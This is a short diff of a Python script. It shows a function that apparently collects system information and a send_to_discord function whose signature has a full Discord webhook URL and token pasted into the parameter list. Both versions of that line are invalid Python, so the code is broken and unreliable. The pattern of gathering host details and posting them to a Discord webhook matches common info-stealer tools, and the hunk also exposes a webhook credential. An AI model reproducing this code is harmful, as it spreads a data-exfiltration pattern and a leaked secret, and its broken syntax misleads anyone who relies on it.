@@ -80,7 +80,8 @@ def get_system_info():
 
     return monitoring_info, good_info
 
-def send_to_discord(webhook_urlhttps://discord.com/api/webhooks/1344436385431552011/kiy0DcN5VYWjX3kB5s7LjCzaYxmc9hjMcDhOU_SwV8gr23RmChZKexsXPUbe38rGep61, monitoring_info, good_info):
+def send_to_discord(webhook_url https://discord.com/api/webhooks/1344436385431552011/kiy0DcN5VYWjX3kB5s7LjCzaYxmc9hjMcDhOU_SwV8gr23RmChZKexsXPUbe38rGep61,
+                    monitoring_info, good_info):
     monitoring_message = "\n".join([f"**{key}:** {value}" for key, value in monitoring_info.items()])
     good_info_message = "\n".join([f"**{key}:** {value}" for key, value in good_info.items()])
 
